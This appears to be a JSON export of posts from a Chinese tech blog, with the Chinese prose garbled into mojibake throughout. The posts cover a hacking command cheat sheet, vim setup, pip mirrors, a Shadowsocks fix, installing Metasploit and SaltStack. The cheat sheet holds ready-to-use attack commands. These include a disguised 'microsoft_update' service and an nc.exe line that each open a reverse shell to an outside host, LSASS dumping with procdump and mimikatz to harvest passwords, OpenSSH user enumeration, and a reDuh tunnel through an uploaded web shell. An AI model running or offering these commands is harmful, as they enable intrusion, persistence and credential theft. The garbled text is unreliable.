è¿›è¡Œæ—¶åºæ”»å‡»çš„ python2 è„šæœ¬ï¼Œå…¶å¯ä»¥åˆ©ç”¨æ—¶åºæ”»å‡»æšä¸¾ OpenSSH ç”¨æˆ·åï¼Œå¹¶åœ¨ä¸€å®šæ¡ä»¶ä¸‹å¯ä»¥å¯¹ OpenSSH æœåŠ¡å™¨è¿›è¡Œ DOS æ”»å‡»ã€‚ 123# https://github.com/c0r3dump3d/osueta$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes â€“dos no -L userfile.txt ä½¿ç”¨ ReDuh æ„é€ åˆæ³•çš„ HTTP è¯·æ±‚ä»¥å»ºç«‹ TCP é€šé“ ReDuh æ˜¯ä¸€ä¸ªé€šè¿‡ HTTP åè®®å»ºç«‹éš§é“ä¼ è¾“å„ç§å…¶ä»–æ•°æ®çš„å·¥å…·ã€‚å…¶å¯ä»¥æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡ http/https éš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªè¿é€šå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚ 123456789101112131415161718192021# https://github.com/sensepost/reDuh# æ­¥éª¤ 1# ä¸Šä¼  reDuh.jsp ç›®æ ‡æœåŠ¡å™¨$ http://192.168.10.50/uploads/reDuh.jsp# æ­¥éª¤ 2# åœ¨æœ¬æœºè¿è¡Œ reDuhClient $ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp# æ­¥éª¤ 3# ä½¿ç”¨ nc è¿æ¥ç®¡ç†ç«¯å£$ nc -nvv 127.0.0.1 1010# æ­¥éª¤ 4# ä½¿ç”¨éš§é“è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç›®æ ‡ç«¯å£[createTunnel] 7777:172.16.0.4:3389# æ­¥éª¤ 5# ä½¿ç”¨ RDP è¿æ¥è¿œç¨‹$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777 Linux å¸¸ç”¨å®‰å…¨å‘½ä»¤1234567891011121314151617181920212223242526272829303132333435363738394041# ä½¿ç”¨ uid æŸ¥æ‰¾å¯¹åº”çš„ç¨‹åºfind / -uid 0 -perm -4000# æŸ¥æ‰¾å“ªé‡Œæ‹¥æœ‰å†™æƒé™find / -perm -o=w# æŸ¥æ‰¾åç§°ä¸­åŒ…å«ç‚¹å’Œç©ºæ ¼çš„æ–‡ä»¶find / -name &quot; &quot; -printfind / -name &quot;..&quot; -printfind / -name &quot;. &quot; -printfind / -name &quot; &quot; -print# æŸ¥æ‰¾ä¸å±äºä»»ä½•äººçš„æ–‡ä»¶find / -nouser# æŸ¥æ‰¾æœªé“¾æ¥çš„æ–‡ä»¶lsof +L1# è·å–è¿›ç¨‹æ‰“å¼€ç«¯å£çš„ä¿¡æ¯lsof -i# çœ‹çœ‹ ARP è¡¨ä¸­æ˜¯å¦æœ‰å¥‡æ€ªçš„ä¸œè¥¿arp -a# æŸ¥çœ‹æ‰€æœ‰è´¦æˆ·getent passwd# æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ç»„getent group# åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„ crontabsfor user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done# ç”Ÿæˆéšæœºå¯†ç cat /dev/urandom| tr -dc â€˜a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=â€™|fold -w 12| head -n 4# æŸ¥æ‰¾æ‰€æœ‰ä¸å¯ä¿®æ”¹çš„æ–‡ä»¶find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep â€˜^â€¦.iâ€™# ä½¿æ–‡ä»¶ä¸å¯ä¿®æ”¹chattr -i file å®ç”¨çš„ Windows cmd å‘½ä»¤123456789101112net localgroup Usersnet localgroup Administratorssearch dir/s *.docsystem(&quot;start cmd.exe /k $cmd&quot;)sc create microsoft_update binpath=&quot;cmd /K start c:\\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore/c C:\\nc.exe -e c:\\windows\\system32\\cmd.exe -vv 23.92.17.103 7779mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;Procdump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;C:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 ä½ç³»ç»ŸC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 ä½ç³»ç»Ÿ","raw":null,"content":null,"categories":[{"name":"Sec","slug":"Sec","permalink":"https://kionf.com/categories/Sec/"},{"name":"Kali","slug":"Sec/Kali","permalink":"https://kionf.com/categories/Sec/Kali/"}],"tags":[{"name":"Hacker","slug":"Hacker","permalink":"https://kionf.com/tags/Hacker/"}]},{"title":"è‡ªå®šä¹‰VIMæ’ä»¶ä¸ºIDEåˆ©å™¨","slug":"vim-plugin","date":"2016-12-20T16:00:00.000Z","updated":"2018-10-31T10:19:28.327Z","comments":true,"path":"2016/12/21/vim-plugin/","link":"","permalink":"https://kionf.com/2016/12/21/vim-plugin/","excerpt":"\n\nå¦‚å›¾æ˜¯VIMè‡ªå®šä¹‰æ’ä»¶åŠé…ç½®åçš„æ¼”ç¤ºï¼Œè™½ç„¶æœ‰Pycharmä½†æ˜¯ç®—ä¸ä¸Šè½»é‡çº§ï¼Œå†™ä¸ªè¿ç»´å°è„šæœ¬æ ¹æœ¬ç”¨ä¸åˆ°ï¼Œä¸€èˆ¬ç¬”è€…åªæœ‰åœ¨å†™Djangoæˆ–è¯»pythoné¡¹ç›®æºç çš„æ—¶å€™ä¼šç”¨ï¼Œsoæˆ‘ä»¬å¼€å§‹å§\n","text":"å¦‚å›¾æ˜¯VIMè‡ªå®šä¹‰æ’ä»¶åŠé…ç½®åçš„æ¼”ç¤ºï¼Œè™½ç„¶æœ‰Pycharmä½†æ˜¯ç®—ä¸ä¸Šè½»é‡çº§ï¼Œå†™ä¸ªè¿ç»´å°è„šæœ¬æ ¹æœ¬ç”¨ä¸åˆ°ï¼Œä¸€èˆ¬ç¬”è€…åªæœ‰åœ¨å†™Djangoæˆ–è¯»pythoné¡¹ç›®æºç çš„æ—¶å€™ä¼šç”¨ï¼Œsoæˆ‘ä»¬å¼€å§‹å§ 1. å®‰è£…æ’ä»¶ç®¡ç†å·¥å…·Vundle1git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle ç¼–è¾‘æ–‡ä»¶~/.vimrc 123456789101112131415set nocompatible &quot; be iMprovedfiletype off &quot; required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()&quot;my Bundle here:Bundle &apos;Valloric/YouCompleteMe&apos; &quot;ä»£ç è¡¥å…¨Plugin &apos;Yggdroot/indentLine&apos; &quot;å‚ç›´å¯¹é½çº¿Plugin &apos;Chiel92/vim-autoformat&apos; &quot;è‡ªåŠ¨è¯­æ³•ç¼©è¿›filetype plugin indent on&quot; hot key ä¿®æ”¹å®Œæˆåå‘½ä»¤è¡Œæ‰§è¡Œ vim +PluginInstall +qall ç­‰å¾…å®‰è£…å®Œæˆï¼Œæ‰§è¡Œvim +BundleInstall +qall ä¸‹è½½Valloric/YouCompleteMeåŒ…ï¼ˆå¯èƒ½ä¹…äº›ï¼‰ 2. ç¼–è¯‘å®‰è£…YouCompleteMeå®‰è£…ç¼–è¯‘æ‰€éœ€è½¯ä»¶ï¼š 12sudo apt-get install build-essential cmakesudo apt-get install python-dev python3-dev å¯é€‰ç¼–è¯‘æ”¯æŒä»£ç è¡¥å…¨1. ç¼–è¯‘å…·æœ‰å¯¹Cç³»åˆ—è¯­è¨€æ”¯æŒçš„YCMï¼š 12cd ~/.vim/bundle/YouCompleteMe./install.py --clang-completer 2. ç¼–è¯‘YCMæ²¡æœ‰Cè¯­è¨€çš„æ”¯æŒï¼š 12cd ~/.vim/bundle/YouCompleteMe./install.py 3. ç¼–è¯‘æ‰€æœ‰æ”¯æŒçš„è¯­è¨€ï¼š 12cd ~/.vim/bundle/YouCompleteMe./install.py --all è„šæœ¬ä¼šè‡ªåŠ¨ä¸‹è½½æ‰€éœ€åŒ…ï¼Œç¬”è€…é€‰æ‹©çš„æ˜¯ç¼–è¯‘æ‰€æœ‰æ”¯æŒè¯­è¨€å…¨éƒ¨ä¸‹æ¥å¤§å°åœ¨400MBå·¦å³ 3. æŠ¥é”™è§£å†³æŠ¥é”™å¦‚ä¸‹ï¼š 1YouCompleteMe unavailable: requires Vim compiled with Python 2.x support åŸå› ï¼š æ‰§è¡Œvim --version|grep python 12-python-python3 vimç¼–è¯‘å®‰è£…çš„æ—¶å€™é»˜è®¤æ²¡æœ‰æ”¯æŒPython è§£å†³ï¼š åœ¨Debianä¸­sudo apt-get install vim-nox åœ¨Ubuntuä¸­sudo apt-get install vim-gnome-py2 å…¶ä»–Linuxå‘è¡Œç‰ˆä¸­å¦‚æœæ²¡æœ‰ä¸Šè¿°è½¯ä»¶åŒ…ï¼Œéœ€è¦é‡æ–°ä¸‹è½½vimæºç é‡æ–°ç¼–è¯‘ï¼ŒåŠ é€‰é¡¹--enable-python3interp=yes æ›´å¤šè§£å†³æ–¹æ¡ˆï¼šstackoverflow åªæœ‰ä¸ªåˆ«å‘è¡Œç‰ˆä¸­Vimä¼šä¸ç¼–è¯‘æ”¯æŒPython é™„åŠ ï¼š pythonäº¤äº’æ¨¡å¼ä¸­ä»£ç è‡ªåŠ¨è¡¥å…¨ï¼ŒåŠç¬”è€….vimrcé…ç½®æ–‡ä»¶å®¶ç›®å½•å†™å…¥.pythontabæ–‡ä»¶ vim ~/.pythontab 12345678910111213141516171819# python startup file# -*- coding: utf8 -*-import sysimport readlineimport rlcompleterimport atexitimport os# tab completionreadline.parse_and_bind('tab: complete') #tabé”®å¯è‡ªå®šä¹‰# history filehistfile = os.path.join(os.environ['HOME'], '.pythonhistory')try: readline.read_history_file(histfile)except IOError: passatexit.register(readline.write_history_file, histfile)del os, histfile, readline, rlcompleter chmod +x .pythontab ç¼–è¾‘~/.bashrcæ–‡ä»¶åŠ å…¥ç¯å¢ƒå˜é‡ 1echo \"export PYTHONSTARTUP=~/.pythontab\" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc æµ‹è¯•ï¼š åŒå‡»tabé”®è¡¥å…¨,å¯æ›´æ”¹åœ¨~/.pythontabæ–‡ä»¶ä¸­æœ‰åšæ³¨é‡Š 123456789101112kionf@kionf-pc[18:23]~:$ pythonPython 2.7.12+ (default, Aug 4 2016, 20:04:34) [GCC 6.1.1 20160724] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import random&gt;&gt;&gt; random.random.BPF random.__reduce__( random.betavariate(random.LOG4 random.__reduce_ex__( random.choice(random.NV_MAGICCONST random.__repr__( random.division..........................................................................random.__package__ random._warn( &gt;&gt;&gt; random. .vimrcé…ç½®æ–‡ä»¶ 12345678910111213141516171819202122232425set nocompatible \" be iMprovedset tabstop=4 \"tabé”®ä¸º4ä¸ªç©ºæ ¼set shiftwidth=4set expandtabset nu \"æ˜¾ç¤ºè¡Œå·ï¼Œå¤åˆ¶çš„æ—¶å€™å¯ä»¥:set nu!æ¥å–æ¶ˆæ˜¾ç¤ºsyntax onfiletype off \" required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()\"my Bundle here:Bundle 'Valloric/YouCompleteMe'Plugin 'Yggdroot/indentLine'Plugin 'Chiel92/vim-autoformat'filetype plugin indent on\" hot keynoremap &lt;F3&gt; :Autoformat&lt;CR&gt; \"è‡ªåŠ¨ç¼©è¿›nnoremap &lt;silent&gt; &lt;F2&gt; :!clear;python %&lt;CR&gt; \"è°ƒè¯•pythonæ–‡ä»¶vimä¸‹F2è¿è¡Œå½“å‰æ–‡ä»¶","raw":null,"content":null,"categories":[{"name":"Vim","slug":"Vim","permalink":"https://kionf.com/categories/Vim/"}],"tags":[]},{"title":"æ›´æ”¹pipæºä¸ºå›½å†…é˜¿é‡Œæº","slug":"linux-pip","date":"2016-12-14T16:00:00.000Z","updated":"2018-10-31T10:19:28.303Z","comments":true,"path":"2016/12/15/linux-pip/","link":"","permalink":"https://kionf.com/2016/12/15/linux-pip/","excerpt":"pipé»˜è®¤æºä¸ºå›½å¤–ï¼Œsoæé«˜ä¸‹è½½é€Ÿåº¦æ›´æ¢å›½å†…é˜¿é‡Œæºï¼ŒåŠaptæºã€å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦ï¼ŒåºŸè¯ä¸å¤šç›´è¿›ä¸»é¢˜\n","text":"pipé»˜è®¤æºä¸ºå›½å¤–ï¼Œsoæé«˜ä¸‹è½½é€Ÿåº¦æ›´æ¢å›½å†…é˜¿é‡Œæºï¼ŒåŠaptæºã€å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦ï¼ŒåºŸè¯ä¸å¤šç›´è¿›ä¸»é¢˜ 1. åˆ›å»ºé…ç½®æ–‡ä»¶1mkdir ~/.pip/ &amp;&amp; cd ~/.pip/; vim pip.conf 2. æ·»åŠ é˜¿é‡Œæºæ·»åŠ å¦‚ä¸‹å†…å®¹ 12345[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 3. æµ‹è¯•1234567891011root@kalivi[12:13].pip:# pip install --upgrade pipYou are using pip version 7.1.0, however version 9.0.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.Collecting pip Downloading http://mirrors.aliyun.com/pypi/packages/b6/ac/7015eb97dc749283ffdec1c3a88ddb8ae03b8fad0f0e611408f196358da3/pip-9.0.1-py2.py3-none-any.whl (1.3MB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1.3MB 5.0MB/s Installing collected packages: pip Found existing installation: pip 7.1.0 Uninstalling pip-7.1.0: Successfully uninstalled pip-7.1.0Successfully installed pip-9.0.1 é™„ä¸Škali rollingæ¸…åå¤§å­¦apté•œåƒæº deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦123echo \"PS1='\\[\\e[31m\\]\\u@\\h\\[\\e[m\\][\\A]\\[\\e[34m\\]\\W:\\[\\e[34m\\]\\$\\[\\e[m\\] '\" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrcroot@kalivi[12:23]~:#","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"https://kionf.com/categories/Linux/"},{"name":"pip","slug":"Linux/pip","permalink":"https://kionf.com/categories/Linux/pip/"}],"tags":[{"name":"pip","slug":"pip","permalink":"https://kionf.com/tags/pip/"}]},{"title":"ShadowSockså¯åŠ¨æŠ¥é”™undefined symbol EVP_CIPHER_CTX_cleanup","slug":"errornote-ss","date":"2016-12-14T16:00:00.000Z","updated":"2018-10-31T10:19:28.291Z","comments":true,"path":"2016/12/15/errornote-ss/","link":"","permalink":"https://kionf.com/2016/12/15/errornote-ss/","excerpt":"è§£å†³opensslå‡çº§åˆ°1.1.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¯¼è‡´shadowsocks2.8.2å¯åŠ¨æŠ¥undefined symbol: EVP_CIPHER_CTX_cleanupé”™è¯¯ã€‚\n","text":"è§£å†³opensslå‡çº§åˆ°1.1.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¯¼è‡´shadowsocks2.8.2å¯åŠ¨æŠ¥undefined symbol: EVP_CIPHER_CTX_cleanupé”™è¯¯ã€‚ å‡†å¤‡ç¿»å¢™å†²æµªçš„æ—¶å€™ShadowsocksæŠ¥é”™å¦‚ä¸‹ï¼š12AttributeError: /usr/local/ssl/lib/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanupshadowsocks start failed è§£å†³æ–¹æ³• ï¼š1. vimæ‰“å¼€æ–‡ä»¶openssl.pyvim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py è·¯å¾„ä¸åŒæ ¹æ®æŠ¥é”™è·¯å¾„è€Œå®š 2. ä¿®æ”¹libcrypto.EVP_CIPHER_CTX_cleanup.argtypes:%s/cleanup/reset/ :x ä»¥ä¸Šä¸¤æ¡ä¸ºVIMå‘½ä»¤ï¼Œ æ›¿æ¢æ–‡ä¸­libcrypto.EVP_CIPHER_CTX_cleanup.argtypes ä¸ºlibcrypto.EVP_CIPHER_CTX_reset.argtypes å…±ä¸¤å¤„ï¼Œå¹¶ä¿å­˜ 3. è¿è¡ŒShadowsocksOK åŸå› ï¼šè¿™ä¸ªé—®é¢˜æ˜¯ç”±äºåœ¨openssl1.1.0ç‰ˆæœ¬ä¸­ï¼ŒåºŸå¼ƒäº†EVP_CIPHER_CTX_cleanupå‡½æ•°ï¼Œå¦‚å®˜ç½‘ä¸­æ‰€è¯´ï¼š EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset(). EVP_CIPHER_CTX_resetå‡½æ•°æ›¿ä»£äº†EVP_CIPHER_CTX_cleanupå‡½æ•° EVP_CIPHER_CTX_resetå‡½æ•°è¯´æ˜ï¼š EVP_CIPHER_CTX_reset() clears all information from a cipher context and free up any allocated memory associate with it, except the ctx itself. This function should be called anytime ctx is to be reused for another EVP_CipherInit() / EVP_CipherUpdate() / EVP_CipherFinal() series of calls. EVP_CIPHER_CTX_cleanupå‡½æ•°è¯´æ˜ï¼š EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it. It should be called after all operations using a cipher are complete so sensitive information does not remain in memory. å¯ä»¥çœ‹å‡ºï¼ŒäºŒè€…åŠŸèƒ½åŸºæœ¬ä¸Šç›¸åŒï¼Œéƒ½æ˜¯é‡Šæ”¾å†…å­˜ï¼Œåªæ˜¯åº”è¯¥è°ƒç”¨çš„æ—¶æœºç¨æœ‰ä¸åŒï¼Œæ‰€ä»¥ç”¨resetä»£æ›¿cleanupé—®é¢˜ä¸å¤§ã€‚ æç¤ºï¼šopenssl1.1.0ç›®å‰å…¼å®¹æ€§å¾ˆä¸å¥½ï¼Œå¤§éƒ¨åˆ†çš„è½¯ä»¶éƒ½ä¸æ”¯æŒç›®å‰æ”¯æŒçš„æœ‰nginx-1.11.5ã€curl-7.50.3ä¸æ”¯æŒçš„æœ‰PHP-7.0.12ã€openssh-7.3p1æ‰€ä»¥å¦‚æœå†³å®šä½¿ç”¨openssl1.1.0éœ€è¦è€ƒè™‘å¾ˆå¤šå…¼å®¹é—®é¢˜ï¼Œå¿…é¡»ä¿ç•™1.0.2æˆ–1.0.1(ä¸æ¨èï¼Œå­˜åœ¨ä¸€äº›å·²çŸ¥æ¼æ´ï¼Œæœ€é‡è¦çš„æ˜¯å¦‚æœæœåŠ¡å™¨è¦å¼€http2ï¼Œç”±äºæ–°ç‰ˆchromeå¿…é¡»ä½¿ç”¨ALPNçš„é™åˆ¶ï¼Œåªæœ‰1.0.2ç‰ˆæœ¬æ”¯æŒALPNï¼Œæ‰€ä»¥å¿…é¡»å‡çº§åˆ°1.0.2)ç‰ˆæœ¬ä»¥ä¾¿ç¼–è¯‘å…¶ä»–ç¨‹åºã€‚","raw":null,"content":null,"categories":[{"name":"ErrorNote","slug":"ErrorNote","permalink":"https://kionf.com/categories/ErrorNote/"}],"tags":[]},{"title":"RedHat6/CentOS6 å®‰è£…Metasploit","slug":"kali-metasploit","date":"2016-12-05T16:00:00.000Z","updated":"2018-10-31T10:19:28.291Z","comments":true,"path":"2016/12/06/kali-metasploit/","link":"","permalink":"https://kionf.com/2016/12/06/kali-metasploit/","excerpt":"\n\næœ¬ç« è®°å½•åœ¨RedHat6/CentOS6ä¸Šå®‰è£…Metasploitï¼Œå› ä¸ºå‘é˜Ÿå‹ç»™äº†å°Redhat6ç³»ç»Ÿçš„äº‘ä¸»æœºã€‚åªèƒ½è‡ªå·±æèµ·æ¥äº†\n","text":"æœ¬ç« è®°å½•åœ¨RedHat6/CentOS6ä¸Šå®‰è£…Metasploitï¼Œå› ä¸ºå‘é˜Ÿå‹ç»™äº†å°Redhat6ç³»ç»Ÿçš„äº‘ä¸»æœºã€‚åªèƒ½è‡ªå·±æèµ·æ¥äº† 1. Metasploitmsfè¿™éƒ¨åˆ†msfinstallè„šæœ¬ä¼šè‡ªåŠ¨æ¥å®‰è£…ï¼Œæ‰€ä»¥éœ€è¦é…ç½®çš„ä¹Ÿæ¯”è¾ƒå°‘ ä¸‹è½½å®˜æ–¹æä¾›çš„å®‰è£…è„šæœ¬ï¼Œå¹¶æ‰§è¡Œ 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall é™é™ç­‰å¾…å®ƒä¸‹è½½å®Œã€‚ã€‚ã€‚msfinstallè„šæœ¬åªä¼šå®‰è£…metasploitï¼Œä¸ä¼šå®‰è£…postgresql 2. Postgresqlyum -y install postgresql postgresql-server è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯epelæº rpm -ivh http://dl.fedoraproject.org/pub/epel/6Server/x86_64/epel-release-6-8.noarch.rpm yum clean all &amp;&amp; yum makecache 3. é…ç½®Postgresql(1)æ·»åŠ æ•°æ®åº“ï¼Œç”¨æˆ·åˆå§‹åŒ–å¯åŠ¨ : service postgresql initdb service postgresql start 1234567891011121314#åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·su - postgres#åˆ›å»ºæ•°æ®åº“å’Œç”¨æˆ·psqlpostgres=# create user \"youruser\" with password 'yourpasswd' nocreatedb;CREATE ROLEpostgres=# create database \"msf4\" with owner=\"youruser\";CREATE DATABASEpostgres=# \\qé€€å‡º (2)ä¿®æ”¹æœåŠ¡é…ç½®æ–‡ä»¶åˆ‡æ¢å›root vim /var/lib/pgsql/data/postgresql.conf åœ¨æˆ‘çš„æœºå™¨ä¸Šæ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œæœ‰å¯èƒ½ä¼šä¸åŒï¼Œåå­—ä¸€æ ·è‡ªè¡ŒæŸ¥æ‰¾ 1234567#å…±ä¿®æ”¹2å¤„æ›´æ”¹ #listen_addresses = 'localhost'ä¸º listen_addresses = '127.0.0.1'æ›´æ”¹ #password_encryption = onä¸º password_encryption = on vim /var/lib/pgsql/data/pg_hba.conf 123#æ–‡ä»¶æœ«å°¾å¤„æ›´æ”¹ host all all 127.0.0.1/32 identä¸º host all all 127.0.0.1/32 md5 (3)é‡å¯æœåŠ¡service postgresql restart psql -U youruser -h 127.0.0.1 -dmsf4 æµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ 4. é…ç½®Metasploitvim /root/.msf4/database.yml æ·»åŠ å¦‚ä¸‹å†…å®¹ 123456789production: adapter: \"postgresql\" database: \"msf4\" username: \"youruser\" password: \"yourpasswd\" host: \"127.0.0.1\" port: 5432 pool: 5 timeout: 5 cp /root/.msf4/database.yml /var/lib/pgsql/.msf4/database.yml msfåˆå§‹åŒ–æ•°æ®åº“ su - postgres msfdb init 5. è¿è¡Œmsfmsfconsole æŸ¥çœ‹æ•°æ®åº“è¿æ¥çŠ¶æ€ msf &gt; db_status [*] postgresql connected to msf4#è¡¨ç¤ºè¿æ¥æˆåŠŸ å½“ä½¿ç”¨searchæœç´¢æ¨¡æ¿ä¼šæç¤º[!] Module database cache not built yet, using slow searchæ„æ€æ˜¯æ•°æ®åº“æ²¡æœ‰å»ºç«‹ç¼“å­˜ msf &gt; db_rebuild_cache è¿™æ ·å°±ä¼šåœ¨åå°å»ºç«‹æ•°æ®åº“ç¼“å­˜äº†ï¼Œè‡³æ­¤å…¨éƒ¨å®‰è£…é…ç½®å·²å®Œæˆã€‚åé¢ä¼šå†™ä¸€å†™å…³äºmetasploitçš„åº”ç”¨ã€‚","raw":null,"content":null,"categories":[{"name":"Sec","slug":"Sec","permalink":"https://kionf.com/categories/Sec/"},{"name":"metasploit","slug":"Sec/metasploit","permalink":"https://kionf.com/categories/Sec/metasploit/"}],"tags":[]},{"title":"Linux è‡ªåŠ¨åŒ–è¿ç»´ä¹‹SlatStackå®‰è£…","slug":"linux-saltstack01","date":"2016-07-17T16:00:00.000Z","updated":"2018-10-31T10:19:28.303Z","comments":true,"path":"2016/07/18/linux-saltstack01/","link":"","permalink":"https://kionf.com/2016/07/18/linux-saltstack01/","excerpt":"slatstackå…¥é—¨å®‰è£… \n","text":"slatstackå…¥é—¨å®‰è£… saltstackåŸºæœ¬åŸç†ï¼š SaltStacké‡‡ç”¨ C/Sæ¨¡å¼ï¼Œserverç«¯å°±æ˜¯saltçš„masterï¼Œclientç«¯å°±æ˜¯minionï¼Œminionä¸masterä¹‹é—´é€šè¿‡ZeroMQæ¶ˆæ¯é˜Ÿåˆ—é€šä¿¡ï¼Œæ˜¯ä¸€ä¸ªåŒæ—¶å¯¹ä¸€ç»„æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤å’ŒçŠ¶æ€ç®¡ç†çš„å·¥å…·ã€‚ minionä¸Šçº¿åå…ˆä¸masterç«¯è”ç³»ï¼ŒæŠŠè‡ªå·±çš„pub keyå‘è¿‡å»ï¼Œè¿™æ—¶masterç«¯é€šè¿‡salt-key -Lå‘½ä»¤å°±ä¼šçœ‹åˆ°minionçš„keyï¼Œæ¥å—è¯¥minion-keyåï¼Œä¹Ÿå°±æ˜¯masterä¸minionå·²ç»äº’ä¿¡ masterå¯ä»¥å‘é€ä»»ä½•æŒ‡ä»¤è®©minionæ‰§è¡Œäº†ï¼Œsaltæœ‰å¾ˆå¤šå¯æ‰§è¡Œæ¨¡å—ï¼Œæ¯”å¦‚è¯´cmdæ¨¡å—ï¼Œåœ¨å®‰è£…minionçš„æ—¶å€™å·²ç»è‡ªå¸¦äº†ï¼Œå®ƒä»¬é€šå¸¸ä½äºä½ çš„pythonåº“ä¸­ï¼Œlocate salt | grep /usr/å¯ä»¥çœ‹åˆ°saltè‡ªå¸¦çš„æ‰€æœ‰ä¸œè¥¿ã€‚ è¿™äº›æ¨¡å—æ˜¯pythonå†™æˆçš„æ–‡ä»¶ï¼Œé‡Œé¢ä¼šæœ‰å¥½å¤šå‡½æ•°ï¼Œå¦‚cmd.runï¼Œå½“æˆ‘ä»¬æ‰§è¡Œsalt &#39;*&#39; cmd.run &#39;uptime&#39;çš„æ—¶å€™ï¼Œmasterä¸‹å‘ä»»åŠ¡åŒ¹é…åˆ°çš„minionä¸Šå»ï¼Œminionæ‰§è¡Œæ¨¡å—å‡½æ•°ï¼Œå¹¶è¿”å›ç»“æœã€‚masterç›‘å¬4505å’Œ4506ç«¯å£ï¼Œ4505å¯¹åº”çš„æ˜¯ZMQçš„PUB systemï¼Œç”¨æ¥å‘é€æ¶ˆæ¯ï¼Œ4506å¯¹åº”çš„æ˜¯REP systemæ˜¯æ¥æ¥å—æ¶ˆæ¯çš„ã€‚ å…·ä½“æ­¥éª¤å¦‚ä¸‹: Salt stackçš„Masterä¸Minionä¹‹é—´é€šè¿‡ZeroMqè¿›è¡Œæ¶ˆæ¯ä¼ é€’ï¼Œä½¿ç”¨äº†ZeroMqçš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œè¿æ¥æ–¹å¼åŒ…æ‹¬tcpï¼Œipc saltå‘½ä»¤ï¼Œå°†cmd.run lså‘½ä»¤ä»salt.client.LocalClient.cmd_cliå‘å¸ƒåˆ°masterï¼Œè·å–ä¸€ä¸ªJodidï¼Œæ ¹æ®jobidè·å–å‘½ä»¤æ‰§è¡Œç»“æœã€‚ masteræ¥æ”¶åˆ°å‘½ä»¤åï¼Œå°†è¦æ‰§è¡Œçš„å‘½ä»¤å‘é€ç»™å®¢æˆ·ç«¯minionã€‚ minionä»æ¶ˆæ¯æ€»çº¿ä¸Šæ¥æ”¶åˆ°è¦å¤„ç†çš„å‘½ä»¤ï¼Œäº¤ç»™minion._handle_aeså¤„ç† minion._handle_aeså‘èµ·ä¸€ä¸ªæœ¬åœ°çº¿ç¨‹è°ƒç”¨cmdmodæ‰§è¡Œlså‘½ä»¤ã€‚çº¿ç¨‹æ‰§è¡Œå®Œlsåï¼Œè°ƒç”¨minion._return_pubæ–¹æ³•ï¼Œå°†æ‰§è¡Œç»“æœé€šè¿‡æ¶ˆæ¯æ€»çº¿è¿”å›ç»™master masteræ¥æ”¶åˆ°å®¢æˆ·ç«¯è¿”å›çš„ç»“æœï¼Œè°ƒç”¨master._handle_aesæ–¹æ³•ï¼Œå°†ç»“æœå†™çš„æ–‡ä»¶ä¸­ 